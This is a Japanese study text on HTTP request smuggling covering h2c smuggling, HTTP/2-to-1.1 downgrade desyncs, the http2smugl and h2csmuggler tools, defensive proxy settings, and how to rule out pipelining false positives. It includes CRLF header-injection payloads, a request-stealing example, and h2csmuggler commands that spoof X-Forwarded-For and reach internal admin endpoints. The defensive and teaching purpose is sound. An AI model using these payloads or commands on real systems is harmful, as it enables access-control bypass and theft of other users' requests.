ここまでの2ツールは「h2cへのプロトコル昇格そのもの」を悪用してプロキシを迂回する攻撃だったのに対し、Emil Lerner による `http2smugl` は別の軸——**HTTP/2 で受信したリクエストをフロントエンドが HTTP/1.1 に変換してバックエンドへ転送する際に生じるスマグリング**——を対象にしたツールである。第2章・第3章で学んだ CL.TE / TE.TE のようなHTTP/1.1同士の解釈齟齬を、HTTP/2起点の変換シナリオに拡張したものと理解するとよい。

#### なぜHTTP/2が新たな攻撃面になるのか

HTTP/2はバイナリプロトコルであり、ヘッダはHPACK圧縮された名前・値のペアとして表現される。この結果、**HTTP/1.1のテキストベースの文法では本来禁止されている文字（スペース、改行、NULバイト等）をヘッダ名やヘッダ値に含めることが技術的に可能**になる。フロントエンド（多くはHTTP/2対応のCDNやロードバランサ）がバックエンドのHTTP/1.1専用サーバと通信するために、受信したHTTP/2リクエストをHTTP/1.1のテキスト形式に変換（ダウングレード）する処理を行うが、このとき禁止文字を含むヘッダをどう扱うかの実装判断がまちまちである。もしフロントエンドがバリデーションを行わずにそのまま文字を書き出してしまうと、バックエンドのHTTP/1.1パーサはそれを「1つのヘッダ」ではなく「複数のヘッダ、あるいは複数のリクエストの境界」として誤って解釈する可能性がある。これがHTTP/2起点のリクエストスマグリングの本質である。

#### 4つの主要な変異（mutation）技法

**1. スペースバリアント**
ヘッダ名の末尾に空白系文字を付加する。通常の半角スペース、タブ（`\t`）、垂直タブ（`\v`）、NULバイト（`\x00`）、および各種Unicode空白文字が試される。HTTP/1.1のパーサの中には、ヘッダ名の末尾に付いたこれらの文字を無視・除去してから照合するものと、そのまま別名として扱うものが存在し、この差異がフロントエンドとバックエンドの間の解釈のずれ（デシンクロナイゼーション）を生む。

**2. アンダースコア置換**
ヘッダ名中のハイフンをアンダースコアに置き換える（例: `transfer_encoding`）。これはCGI由来の実装——CGI環境変数の命名規則ではハイフンが使えずアンダースコアに正規化される慣習——を引き継いだバックエンドが、`transfer_encoding` を `Transfer-Encoding` として暗黙に正規化してしまうことを狙ったものである。フロントエンドはこれを未知のヘッダとして無害に扱う一方、バックエンドがこっそり `Transfer-Encoding: chunked` として解釈すれば、両者の間でボディの区切り方の認識がずれる。

**3. 改行インジェクション**
ヘッダ名またはヘッダ値の中にCRLFシーケンスを注入する。

```
fake\r\ntransfer-encoding: chunked
```

HTTP/2からHTTP/1.1への変換時にこの値がそのままテキストとして書き出されると、CRLFがヘッダの区切りとして解釈され、バックエンドからは「`fake` ヘッダ」と「`transfer-encoding: chunked` ヘッダ」という**2つの独立したヘッダ**が注入されたように見える。これはHTTP/2の設計では本来あり得ない（HPACKでエンコードされたヘッダ値にCRLFが含まれていても、それは1つの値の一部でしかない）状態を、変換処理のバグによって作り出す攻撃である。

**4. Unicode操作**
大文字・小文字変換（ケースフォールディング）の差異を悪用する。例えば `ſ`（U+017F, ロングエス）はUnicode正規化で大文字化すると `S` になり、`K`（ケルビン記号）は大文字化すると `K` になる。ヘッダ名の比較を「まずUnicode正規化してから大文字小文字を無視して比較する」実装と、「バイト列としてそのまま比較する」実装との間で、同じヘッダ名が別名として扱われたり、逆に別のつもりが同一視されたりする不整合を利用する。

#### 検知アルゴリズム

`http2smugl` は、正常なリクエストと変異を加えた不正なリクエストの「ペア」を送信し、レスポンスの違いを3つの観点で比較することで脆弱性を判定する。

- **HTTPステータスコード**（タイムアウトも「固有の値」として扱う）
- **レスポンス長**（応答の長さの分布が分離できるかどうか）
- **レスポンスの挙動パターン**

具体的な検証方法として3種類が実装されている。

1. `Transfer-Encoding: chunked` を用い、正常なボディ（終端チャンク `0\r\n\r\n`）と、不正なチャンクサイズ（`999\r\n` のように実際のデータ長と矛盾する値）を送り分ける。バックエンドがスマグリングされたヘッダを本物のTransfer-Encodingとして解釈していれば、不正なチャンク長に対してタイムアウトなどの異常な挙動を示すことが期待される。
2. `X\r\n\r\n` のようなパターンを使った代替のボディ検証。
3. `Content-Length` のスマグリングを、値 `1` と `-1` で試す方法。原典はこれを「最も信頼性が低いが、バックエンドがヘッダを再処理していることを検出できる」手法だと位置づけている。

#### CLIの使い方

```
http2smugl request [URL] [headers]
```

任意のヘッダを指定してHTTP/2リクエストを送信するコマンド。`\r`、`\n`、`\xXX` 形式のバックスラッシュエスケープをサポートしており、任意バイト列をヘッダ値に埋め込める。

```
http2smugl request https://target.com transfer_encoding:chunked
```

```
http2smugl detect [URL]
```

複数の変異技法を自動的に試行し、識別可能なレスポンスパターンがあれば報告する、いわば「自動スキャンモード」。`--try-http3` フラグを付けると、裸のホスト名指定に対してHTTP/3（QUICベース）とHTTP/2の両方を検証する。

インストールは Go の標準的な方法で行う。

```
go install github.com/neex/http2smugl@latest
```

#### 既知の誤検知（false positive）

原典は運用上重要な誤検知パターンを具体的に列挙しており、これは実際の診断で「脆弱と誤判定しない」ために不可欠な知識である。

- **Amazon ELB**: 疑わしいヘッダをブロックするが、コネクションを再利用しないため実質的なスマグリングには至らない。
- **Apache Traffic Server**: HTTP/2からHTTP/1.1への変換をメモリ内で完結させており、実際のスマグリングは発生しない。
- **Microsoft IIS**: HTTP/2ボディ内のチャンクエンコーディングをデコードする独自挙動を持つが、これ自体は無害。
- **WAF全般**: 任意のフィルタリングルールにより誤検知を引き起こすことがある。

#### HTTP/3対応

QUICベースのHTTP/3についても `https+h3://` というプロトコルプレフィックスで実験的にサポートされているが、原典は「本番運用での使用は推奨しない」と明記している。これは執筆時点（2020年前後の研究公開）でのHTTP/3実装・エコシステムの成熟度を踏まえた注記であり、対象環境のHTTP/3実装状況によって有効性が変わりうる点に留意する必要がある。

#### 実世界での成果

原典によれば、本ツールはCloudflareにおいて空白文字を用いたヘッダスマグリングの脆弱性を実際に発見しており、その詳細はWallarmのブログ記事で報告されている。さらに、改行文字をフィルタしていないカスタムソフトウェアにおいて、未報告の追加の脆弱性も見つかったとされている。この実績は、本ツールが単なる理論的PoCではなく、実運用のCDN・エッジサービスに対して有効な検知手段であったことを裏付けている。

#### 防御への示唆

`http2smugl` が示す技法から導かれる防御上の要点は次の通りである。

- HTTP/2からHTTP/1.1への変換処理を行うすべてのコンポーネント（CDN、ロードバランサ、リバースプロキシ）において、ヘッダ名・値に含まれる制御文字（CR、LF、NUL、各種空白・Unicode空白）を**変換前に厳格に拒否またはエスケープ**する。
- ヘッダ名の正規化（大文字小文字、アンダースコア/ハイフン、Unicode正規化）をフロントエンドとバックエンドで**完全に一致させる**、または正規化を一切行わずバイト列として一貫比較する。
- 可能であれば、バックエンドとの通信も可能な限りHTTP/2（またはHTTP/3）のまま維持し、テキストベースへのダウングレード変換自体を避ける。ダウングレードが必須の構成では、変換ライブラリの実装が最新の既知の誤変換パターンに対処済みか定期的に確認する。

## h2c / 上位HTTPバージョン経由スマグリングの研究

古典的なリクエストスマグリング（HTTP Request Smuggling、以下 HRS）は、`Content-Length` と `Transfer-Encoding` の解釈差という「HTTP/1.1 パーサ同士のズレ」を突く攻撃だった。しかし攻撃対象のプロトコルが HTTP/2・HTTP/3 へ移り、さらに TLS を張らずに HTTP/2 を話す **h2c（HTTP/2 Cleartext）** という仕組みが内部通信で使われ始めたことで、スマグリングの舞台は「バージョン境界」そのものへと広がった。

本節では、発展的スマグリング技法のうち次の2つを研究レベルで扱う。

1. **h2c スマグリング** — フロントプロキシに HTTP/1.1 の Upgrade 機構を悪用させ、プロキシを「素通しトンネル」に変え、バックエンドへ直接 HTTP/2 で話しかけてアクセス制御を回避する技法（Bishop Fox / Jake Miller）。
2. **上位 HTTP バージョン経由のスマグリング** — HTTP/2・HTTP/3 を HTTP/1.1 へ「ダウングレード変換」する際に生まれるパース差を突く技法（Emil Lerner）。

どちらも「境界にいる中間装置（プロキシ・ロードバランサ・キャッシュ）が、上位プロトコルを完全には理解できないまま転送してしまう」という共通構造を持つ。ここが本節の核心である。

> ⚠️ **スコープの明示**: 本節は防御・検知の理解を目的とする。手法の原理と、影響を測るための「自分が管理・許可を得た検証環境での考え方」を説明する。実在サービスや本番環境への無許可検証、破壊的な手順は記述しない。

### 1. 前提知識: h2c（HTTP/2 Cleartext）とは何か

#### HTTP/2 の3つの起動方法

HTTP/2 は「バイナリのフレーム」でやり取りするプロトコルだが、その通信を**どう開始するか**には歴史的に複数の道がある。

| 方式 | 略称 | 起動の合図 | 典型的な用途 |
|------|------|------------|--------------|
| TLS-ALPN ネゴシエーション | h2 | TLS ハンドシェイク中に ALPN 拡張で `h2` を選ぶ | ブラウザ↔公開 Web サーバ（暗号化必須） |
| Upgrade 機構（平文） | h2c | HTTP/1.1 リクエストに `Upgrade: h2c` を付ける | サーバ間・マイクロサービスの平文内部通信 |
| Prior Knowledge（事前合意） | h2c | 最初からクライアントが HTTP/2 の接続プリフェイス（`PRI * HTTP/2.0\r\n...`）を送る | 相手が h2c 対応と分かっている内部通信 |

ここで重要なのは、**ブラウザは h2c を一切使わない**という点だ。ブラウザの HTTP/2 は必ず TLS 上の h2（ALPN）である。h2c は主に「データセンター内部で、低レイテンシのために TLS を省いてサーバ同士が HTTP/2 で話す」ために存在する。つまり h2c 対応バックエンドは「外からは直接触られない前提」で置かれていることが多く、これが攻撃価値を生む。

> sink（入力が最終的に解釈・実行される危険な到達先）の観点で言えば、h2c 対応バックエンドは「本来フロントプロキシのアクセス制御でしか到達できないはずの sink」であり、h2c スマグリングはそこへ**制御を素通しして届かせる**攻撃だ、と捉えると分かりやすい。

#### Upgrade 機構による h2c 起動（RFC 7540 §3.2）

平文で HTTP/2 に切り替える正規の手順は、HTTP/1.1 の汎用アップグレード機構（`Upgrade` ヘッダ、WebSocket と同じ仕組み）を使う。Bishop Fox の解説にある具体例は次のとおり。

```http
GET / HTTP/1.1
Host: www.example.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

各ヘッダの意味と「なぜそう書くか」は以下の通り。

- **`Upgrade: h2c`** — 「この接続を h2c（平文 HTTP/2）に切り替えたい」という要求。切り替えるトークンを指定する。
- **`Connection: Upgrade, HTTP2-Settings`** — `Connection` はホップバイホップ（hop-by-hop、隣接する1区間だけで有効）ヘッダを列挙するためのもの。ここに `Upgrade` と `HTTP2-Settings` を並べることで「この2つは今の接続限りの制御ヘッダだ」と宣言する。**本来、中間プロキシはここに挙がったヘッダを消費して次段へは転送しないのが正しい挙動**である。この「本来消すべきものを消さずに転送する」実装バグこそが攻撃の入口になる。
- **`HTTP2-Settings: AAM...`** — HTTP/2 の初期 SETTINGS フレーム（最大同時ストリーム数などの接続パラメータ）を Base64URL でエンコードしたもの（RFC 7540 §3.2.1）。サーバが即座に HTTP/2 設定を知るために添える。

サーバが受理すると `101 Switching Protocols` を返し、以降その TCP 接続は HTTP/2 のバイナリフレームで会話するトンネルに変わる。

### 2. h2c スマグリングの原理（Bishop Fox）

> ⚠️ **未取得の資料**: 「h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)」（Bishop Fox 技術ブログ、labs.bishopfox.com の元 URL）は、egress 側の名前解決失敗（`getaddrinfo ENOTFOUND` / archive.org もフェッチ不可）により自動取得できませんでした。以下から直接ご覧ください:

> - 旧 URL: https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c
> - ツール/README: https://github.com/BishopFox/h2csmuggler
>
> 以下は、同一内容の Bishop Fox ブログ現行版と公式 README を自動取得できた分に基づく解説である。技術的な結論・コマンド例は原典から抽出している。

#### 攻撃の中核: 「トンネル化でプロキシが盲目になる」

エッジプロキシ（リバースプロキシ）は通常、パス単位のアクセス制御を持つ。たとえば NGINX で次のように「`/flag` への外部アクセスは全拒否」しているとする。

```nginx
location /flag {
    deny all;
}
```

ところがプロキシが h2c の Upgrade 要求を**そのままバックエンドへ転送**してしまうと、次の連鎖が起きる。

1. クライアントがエッジプロキシ宛に `Upgrade: h2c` 付きリクエストを送る。
2. 脆弱なプロキシは `Upgrade` / `Connection` ヘッダを消費せずバックエンドへ転送する。
3. h2c 対応バックエンドが `101 Switching Protocols` を返す。
4. **101 を見たプロキシは「もうこの接続は自分の管理外の生の TCP トンネルだ」と判断し、以降の中身を解釈しなくなる（content-unaware になる）。**
5. その結果、プロキシは「HTTP/2 トンネルの中を流れる個々のリクエスト」を検査できない。`/flag` 拒否ルールも、認証も、WAF も、全部トンネルの外側の話になり効かなくなる。

Bishop Fox の表現を借りれば、プロキシは接続を *"an unmanaged TCP tunnel"（管理されない TCP トンネル）* に「アップグレード」してしまい、もはや制限を強制できない。**これが h2c スマグリングの本質**である。古典的 HRS が「1本のリクエストを2つに割る」パース差の攻撃だったのに対し、h2c スマグリングは「接続そのものを制御外のパイプに変える」構造差の攻撃だ、と対比すると理解しやすい。

一度トンネルが張られれば、HTTP/2 の**多重化（multiplexing、1接続で複数ストリームを並行送信）**により、その1本のトンネル内で任意の複数リクエストをバックエンドへ直接送り込める。

#### なぜプロキシは「消すべきヘッダ」を転送してしまうのか

RFC 上、`Connection` に列挙されたホップバイホップヘッダ（`Upgrade` 含む）は各中間装置が消費すべきものだ。にもかかわらず転送が起きるのは、実装が「知らない Upgrade トークンはとりあえずそのまま後ろへ流す」設計だったり、`proxy_pass` 系の素朴な設定が Upgrade/Connection を明示的に落としていなかったりするためである。特にプロキシ自身が h2c をサポートしていない場合、「自分では処理できない Upgrade をバックエンドに委ねる」形で素通しさせやすい。**プロキシが h2c を自前で終端（サポート）していない平文経路ほど、この攻撃が成立しやすい**、という直感が成り立つ。

#### 影響を受けやすいプロキシ構成

公式ブログと README がまとめる分類は次のとおり（発表当時 2020 年の調査。各製品はその後の版で設定既定値や挙動が変わり得るため、常に対象バージョンで再確認すること）。

- **既定構成で脆弱になり得る:** HAProxy、Traefik、Nuster
- **設定次第で脆弱:** AWS ALB/CLB、NGINX、Apache、Squid、Varnish、Kong、Envoy

素朴な（フィルタリングを入れていない）構成では、既定で `Upgrade` ヘッダをそのまま転送してしまうものがある、という点が要注意である。

#### 攻撃で可能になること（影響）

トンネルが張られた後にできることは、実質「バックエンドと生で会話できる」ことなので広い。

- **アクセス制御バイパス** — 前述の `/flag deny all` のように、エッジで守っていた管理用エンドポイントへ到達する。
- **内部ヘッダの偽造** — `X-Forwarded-For: 127.0.0.1` のような「内部からのアクセスだけ許可」判定を偽装し、内部ダッシュボード等へ入る。
- **Host ヘッダ SSRF / 内部横移動** — バックエンドが Host に基づいて別の内部ホストへプロキシする構成だと、そこを踏み台に内部ネットワークへ。
- **長寿命・無制限のバックエンド直結通信** — 一度張ったトンネルを使い回せる。

#### 検証ツール h2csmuggler の使い方（原典コマンド）

Bishop Fox 公開の `h2csmuggler`（Python3 + `h2` ライブラリ）は、この脆弱性の検出と実証に使う。README から抽出した実コマンド例を、**許可を得た自分の検証環境でのみ使う前提で**引用する。

まず「そのエッジが h2c 素通しするか」の検査:

```bash
# 単一ホストの脆弱性チェック
./h2csmuggler.py -x https://www.example.com/api/ --test

# URL リストを並列スキャン
./h2csmuggler.py --scan-list urls.txt --threads 5
```

`--test`（`-t`）は、プロキシが h2c Upgrade を誤ってバックエンドへ転送するかどうかを判定する。ツールは RFC 的には変則的に「TLS 上で h2c Upgrade を投げる」ことで、非準拠プロキシに対して機能させている（**なぜそうするか**: 対象はしばしば TLS 終端の背後に居るため、TLS の内側から Upgrade を送り込む必要があるからだ）。

トンネル成立後にバックエンドへ直接リクエストを送る例:

```bash
# 内部専用 API を POST で叩く（本来エッジで弾かれるはずのパス）
./h2csmuggler.py -x https://edgeserver -X POST \
  -d '{"user":128457 "role": "admin"}' \
  -H "Content-Type: application/json" \
  http://backend/api/internal/user/permissions

# HTTP/2 多重化を使ったパス総当たり（ワードリストを並行送信）
./h2csmuggler.py -x https://edgeserver -i dirs.txt http://localhost/

# 内部判定を偽装して内部ダッシュボードへ
./h2csmuggler.py -x https://edgeserver \
  -H "X-Forwarded-For: 127.0.0.1" \
  http://backend/system/dashboard
```

`-i`（ワードリスト）指定時は HTTP/2 多重化のおかげで**1本のトンネル内で多数のパスを並行探索**でき高速だ、という点が h2c ならではの効率性である。主なオプションは以下。

| オプション | 意味 |
|-----------|------|
| `-x, --proxy` | 対象プロキシ（トンネルを張る相手） |
| `-X, --request` | メソッド（GET/POST/PUT…） |
| `-d, --data` | ボディ |
| `-H, --header` | 追加ヘッダ（複数可） |
| `-i, --wordlist` | パス総当たり用のリスト |
| `-t, --test` | 単一ホストの脆弱性判定 |
| `-m, --max-time` | ソケットタイムアウト（既定10秒） |
| `--upgrade-only` | `HTTP2-Settings` を外して Upgrade だけ送る |

> 破壊的・無許可の利用は本書のスコープ外である。上記はあくまで「検知ロジック・影響範囲を理解し、自組織の設定監査に活かす」ための引用である。

#### 防御（h2c スマグリング）

原則はただ一つ、**「ユーザ由来の `Upgrade` / `Connection` の値をバックエンドへ転送しない」**。原典が挙げる具体策:

```haproxy
# HAProxy: WebSocket だけ許すなら Upgrade を websocket に正規化
http-request replace-value Upgrade (.*) websocket

# アップグレード自体を使わないなら Upgrade ヘッダを削除
http-request del-header Upgrade
```

```yaml
# Traefik: ミドルウェアで Upgrade を空にする
middlewares:
  testHeader:
    headers:
      customRequestHeaders:
        Upgrade: ""
```

- **設計方針**: 正当なアップグレード（実際に使うなら `websocket` など）だけをホワイトリストで許可し、それ以外は削除する。h2c を内部で使わないなら `Upgrade` を無条件に落とすのが最も堅い。
- **監査観点**: `proxy_pass` 系の素朴な設定が Upgrade/Connection を素通ししていないか、エッジで確認する。プロキシ自身が h2c を終端（サポート）するのか、それとも後段へ委ねるのかを把握する。

> 出典: Research on h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext — https://bishopfox.com/blog/h2c-smuggling-request ／ BishopFox/h2csmuggler README — https://github.com/BishopFox/h2csmuggler

### 3. 上位 HTTP バージョン経由のスマグリング（Emil Lerner）

h2c スマグリングが「接続を丸ごとトンネル化する」攻撃だったのに対し、Emil Lerner の研究（`http2smugl` 作者、2021 年発表）は、**HTTP/2 / HTTP/3 を受けたフロントが、それを HTTP/1.1 へ「ダウングレード変換」してバックエンドへ渡す**構成を狙う。多くの実運用では、外向きは HTTP/2 対応でも、内部のバックエンドは今なお HTTP/1.1 を話す。この**翻訳の境界**で古典的スマグリングが再生する。

#### なぜ HTTP/2→1.1 変換で新たなスマグリングが生まれるか

HTTP/2 は**バイナリプロトコル**で、ヘッダ名・値の長さがフレーム構造で決まる。そのため HTTP/1.1 では禁止されている文字（改行 CR/LF など）が、HTTP/2 のヘッダ値には**構造上入り込めてしまう**。フロントが HTTP/2 リクエストを HTTP/1.1 のテキストへ「文字列として」書き戻すとき、この禁止文字がそのまま HTTP/1.1 の**リクエスト境界を割る道具**に化ける。加えて HTTP/2 では:

- `Transfer-Encoding: chunked` は本来ボディ転送に効果を持たない（HTTP/2 は独自のフレームで長さを管理するため）。
- しかし宣言された `Content-Length` と実データ長がズレることがある。

これらが「フロントとバックエンドで境界解釈が食い違う」古典的 desync の材料になる。要点を Lerner はこう述べる — *「結局は Content-Length / Transfer-Encoding の話。Transfer-Encoding が優先される。だから TE をフロントに処理させずバックエンドへ密輸する」*。

#### 6つのバグカテゴリ

スライドが整理する HTTP/2 固有の6分類は、そのまま「変換のどこがズレるか」の地図になる。

- **Bug #1 — Content-Length と実ボディ長の不一致**: 宣言長より実データが多い/少ないと、余剰分が次リクエストとして解釈され得る。
- **Bug #2 — Content-Length 無しの転送**: フロントが CL を付けずに後段へ渡すと、バックエンドが境界を誤認する。
- **Bug #3 — CL と TE の競合**: 変換時に両方が残り、優先解釈の食い違いで desync。
- **Bug #4 — ヘッダ中の改行**: HTTP/2 はヘッダ値に CR/LF を許容してしまう実装があり、`x:⏎⏎GET /internal HTTP/1.1` のように書くと、HTTP/1.1 化した瞬間に**新しいリクエスト行**が生まれる。もっとも直接的な注入経路。
- **Bug #5 — 緩い検証**: `transfer_encoding`（アンダースコア）や `chunKed`（大小混在）のような変種を通す実装があり、片側だけがそれを TE と認識して解釈差を生む。
- **Bug #6 — RFC 8441 の WebSocket/CONNECT**: HTTP/2 の拡張 CONNECT（`:protocol websocket`）が HTTP/1.1 の `Upgrade` ヘッダへ翻訳される過程を悪用し、プロトコルスマグリングにつなげる。

Bug #4 の注入イメージを、原理が分かる形で示す（**概念図**であり、実在サービスへ向けるものではない）。

```text
# 攻撃者が送る HTTP/2 リクエストの、あるヘッダ値（バイナリなので改行が入る）
foo:  bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal

# フロントがこれを HTTP/1.1 テキストへ素朴に書き戻すと…
GET / HTTP/1.1
Host: victim
foo: bar

GET /admin HTTP/1.1          ← 改行のせいで“2本目のリクエスト”が出現
Host: internal
```

**なぜ成立するか**: HTTP/2 側では `foo` は単なる1つのヘッダ値にすぎず、改行はデータの一部だった。ところが HTTP/1.1 は改行を**メッセージ構造の区切り**と解釈する。フロントが「値の中の改行」を無害化（拒否・エスケープ・除去）せずにテキスト化した瞬間、バックエンドから見れば独立した2本目のリクエストが密輸される。

#### 実在した脆弱な実装（当時）

スライドが挙げる代表例（いずれも発表当時のバージョンの話。修正済みのものが多いので、必ず対象版で確認すること）。

- **Varnish**: `content-length: 0` を受理しながらボディを転送し、バックエンドを desync させた。
- **HAProxy + nghttp2**: WebSocket プロトコル付き CONNECT の翻訳が不適切で、追加リクエストが注入され得た（Bug #6 系）。
- **H2O（HTTP/3・QUIC）**: CL と TE の競合＋ヘッダ改行の複合。HTTP/3 でも同じ「上位→1.1 変換」の病理が現れることを示した。

#### 悪用シナリオ

- **リクエスト窃取（Request Stealing）**: chunked を密輸して「後続の被害者リクエストを自分のボディの続きとして取り込む」。認証済みリクエストの Cookie などが攻撃者側のレスポンスに露出する。
  ```http
  POST /save HTTP/1.1
  Transfer-Encoding: chunked
  ...
  data=GET / HTTP/1.1
  Cookie: secret        ← 被害者の後続リクエストが“ボディ”として吸い込まれる
  ```
- **内部エンドポイントへの到達**: 密輸した GET でフロント制限を回避しバックエンド専用パスへ。
- **キャッシュ汚染（Cache Poisoning）**: 細工リクエストで共有キャッシュを毒し、他ユーザへ影響を波及させる。

#### 検知手法（研究由来）

無許可の攻撃ではなく「自分の系が脆弱かを安全に測る」ための検知ロジックとして重要。

- **手法#1 — バックエンドに“もっとデータを待たせる”**: フロントは送信完了と見なすがバックエンドは続きを待ちタイムアウトする、という時間差で検出。HTTP/1.1 向けには Burp Suite プラグインが実装。
- **手法#2 — chunked 反応の観察**: HTTP/2 のバックエンドは本来 chunked を解釈しないはず。chunked の妥当性でレスポンスが変わるなら脆弱の疑い（誤検知あり）。
- **手法#3 — Content-Length パースの異常**: `x:x⏎content-length:1000` のように「本来レスポンス挙動に影響しないはずのヘッダ」で応答が変わるかを見る。

#### 自動化ツール http2smugl

Lerner は `http2smugl` を公開し、上記カテゴリの自動検出と、任意 HTTP/2 リクエストの手組みを可能にした。原典 URL に置かれたスライド本文（下記 ⚠️ 参照）でツールの位置づけが詳述されている。

#### 未解決の研究領域

スライドは open problem も挙げる。特に **「片方向のサイズ不一致（one-way size discrepancy）」** — バックエンドがフロントより*少なく*読む場合、攻撃は成立するのに、検知手法#1（バックエンドが*多く*待つことを前提）は反応しない、という検知の盲点。ほかに HTTP/1 特有ヘッダ、HPACK（HTTP/2 のヘッダ圧縮）操作、40 以上の実装差が未研究として残る、とされる。

### 4. 2つの技法の対比と、統一的な防御指針

| 観点 | h2c スマグリング | 上位バージョン経由スマグリング |
|------|------------------|-------------------------------|
| 攻撃対象 | 平文で Upgrade を素通しするプロキシ | HTTP/2・3 を 1.1 へ変換するフロント |
| ズレの正体 | 接続がトンネル化し、プロキシが盲目に | ヘッダ/長さの変換パース差（desync） |
| 主武器 | `Upgrade: h2c` / `Connection` の転送 | ヘッダ内改行・CL/TE 競合・緩い検証 |
| 結果 | プロキシ制御の完全バイパス、直結 | リクエスト割り・窃取・キャッシュ汚染 |
| 代表ツール | h2csmuggler | http2smugl |

両者に共通する教訓は明快だ。

1. **「中間装置が理解しきれないプロトコル要素を、そのまま後段へ転送しない」** — h2c では `Upgrade`/`Connection` を、変換系ではヘッダ値中の禁止文字・重複する長さヘッダを、境界で正規化・拒否・削除する。
2. **境界での再検証**: フロントとバックエンドで「リクエストの境界と長さ」の解釈を一致させる。CL と TE が両方あれば拒否、TE 変種（大小・アンダースコア）は拒否、ヘッダ値の CR/LF は拒否。
3. **バージョン依存性を常に意識**: ここで挙げた脆弱実装（Varnish / HAProxy+nghttp2 / H2O / 各プロキシの既定）は 2020〜2021 年時点の調査であり、多くは修正されている。自組織の**対象バージョンで再現・確認**し、陳腐化した前提で判断しないこと。
4. **h2c を内部で使わないなら、平文 Upgrade 経路そのものを塞ぐ**のが最短の防御である。

古典的 HRS が「1台のパーサ実装の甘さ」を突いたのに対し、本節の2技法は「**プロトコル境界での翻訳・トンネル化という設計そのもの**」を突く。上位プロトコルへの移行が進むほど、この「境界の防御」が HRS 対策の主戦場になっていく。

## 誤検知対策：pipelining と smuggling の切り分け

HTTP リクエストスマグリング（HTTP Request Smuggling）の調査で、最も厄介で、かつ最も多くのバグバウンティ提出が却下される原因になっているのが「**pipelining（パイプライン）を smuggling と誤認する false positive（誤検知）**」です。攻撃が成功したように見えても、実際にはフロントエンドとバックエンドの間に脆弱性が存在せず、単にあなたの HTTP クライアントとサーバの間で局所的な現象が起きているだけ、というケースが非常に多くあります。

この節では、PortSwigger の James Kettle による記事（2025年）を軸に、なぜこの誤検知が起きるのか、その原理を「コネクションの再利用」というプロトコルの挙動レベルまで掘り下げて説明し、実務でどう切り分ければよいかを示します。誤検知を潰せるようになることは、報告の説得力を上げるだけでなく、防御側が「本当に修正すべき問題」を見極めるためにも不可欠です。

> ⚠️ 本節はあくまで**防御・検証の理解**を目的とします。実在サービスや本番環境への無許可の検証、破壊的な手順は行わないでください。ここで紹介するテストは、自分が明示的に許可された環境（自分で立てたラボ、正式なスコープ内）でのみ実施してください。

### まず用語を整理する

#### HTTP/1.1 のコネクション再利用（keep-alive）と pipelining

HTTP/1.1 は性能のために、1本の TCP/TLS ソケットの上で**複数のリクエストとレスポンスを連続して流す**ことができます（`Connection: keep-alive`）。これを「コネクション再利用（connection reuse）」と呼びます。

- **コネクション再利用（keep-alive）**：1つ目のリクエストへのレスポンスを受け取ってから、同じソケットで2つ目のリクエストを送る。逐次的。
- **pipelining（パイプライン）**：1つ目のレスポンスを待たずに、2つ目・3つ目のリクエストを立て続けにソケットへ書き込んでしまう。

記事の言葉を借りれば、その内部メカニズムはこうです。

> 「HTTP/1.1 はコネクションを再利用する。すなわち、下層の TCP/TLS ソケット上でリクエストとレスポンスを連結（concatenate）する。」

つまり、ソケット上を流れるバイト列としては、複数のリクエストが単純に**繋がった一本のストリーム**になります。次の例では、1つ目の POST リクエスト（ボディ `12345`、`Content-Length: 5`）の直後に、2つ目の GET リクエストがそのまま連結されています。

```
POST / HTTP/1.1
Host: example.com
Connection: keep-alive
Content-Length: 5

12345GET /robots.txt HTTP/1.1
Host: example.com
```

ここで重要なのは、**`Content-Length: 5` が「ボディは `12345` の5バイトまで」と正しく境界を示している限り、サーバは `12345` の直後から始まる `GET /robots.txt ...` を「2つ目の独立したリクエスト」として正しく解釈する**、という点です。これは正常な HTTP の動作であって、スマグリングではありません。

> 出典: How to distinguish HTTP pipelining from request smuggling — https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling

#### request smuggling（本物の脆弱性）

一方、本物のリクエストスマグリングは、**フロントエンド（リバースプロキシ、ロードバランサ、CDN など）とバックエンド（実際のアプリサーバ）が、リクエストの境界を別々に解釈してしまう「desync（デシンク＝同期ずれ）」**を悪用します。典型的には `Content-Length`（CL）と `Transfer-Encoding`（TE）の解釈食い違い（CL.TE / TE.CL / TE.TE）や、ヘッダの終端の扱いの差から生じます。

決定的な違いは「**誰と誰の間で境界がずれているか**」です。

- **本物の smuggling**：フロントエンド ↔ バックエンドの間で境界がずれる。だから、あなたが送ったリクエストの「余り（prefix）」が、**別の利用者のリクエストの先頭にくっつく**という深刻な被害（他ユーザへの影響、キャッシュ汚染、認証バイパス等）が起こり得る。
- **pipelining の誤検知**：あなたの HTTP クライアント ↔ サーバの間でしか境界の解釈が関わっていない。被害は自分の1本のコネクション内で閉じており、他人に影響しない。

### 誤検知はなぜ起きるのか——原理

#### 「クライアントとサーバの desync」を「サーバ間の desync」と錯覚する

誤検知の核心は次の一文に集約されます。

> 「もしあなたのリクエストスマグリングの PoC が、コネクションを再利用したときにだけ動くなら、それは**おそらく false positive（誤検知）**である。」

なぜでしょうか。あなたが壊れたヘッダを含むリクエストを送ると、**あなたのツール（HTTP クライアント）とターゲットサーバの間**で境界解釈がずれることがあります。記事はこう述べます。

> 「不正な Content-Length ヘッダは、あなたの HTTP クライアントとターゲットサーバの間の desync を引き起こし得る——インフラ構成要素（フロントエンドとバックエンド）の間の desync ではなく。」

具体例を見ましょう。次は、ヘッダ名を `Content-Length` ではなく **`Content_Length`（ハイフンでなくアンダースコア）** にした「壊れた」リクエストです。

```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```

`Content_Length` は正規の `Content-Length` ヘッダとしては認識されません。すると、あるサーバはこのヘッダを無視し（＝ボディ長 0 として扱い）、あるツールは別の解釈をします。この解釈差により、1本のコネクションでこのリクエストを2回送ると、**両方のレスポンスが返ってくる**ように見え、あたかも「2つ目の GET /robots.txt がスマグリングで通った」ように錯覚します。

しかし実際には、これは**あなたのクライアントとサーバの間**の解釈ずれにすぎません。フロントエンドとバックエンドの間の desync は起きていないので、他ユーザに prefix がくっつくような本物の被害は生じません。だから「コネクション再利用時だけ動く」＝誤検知の強いサインなのです。

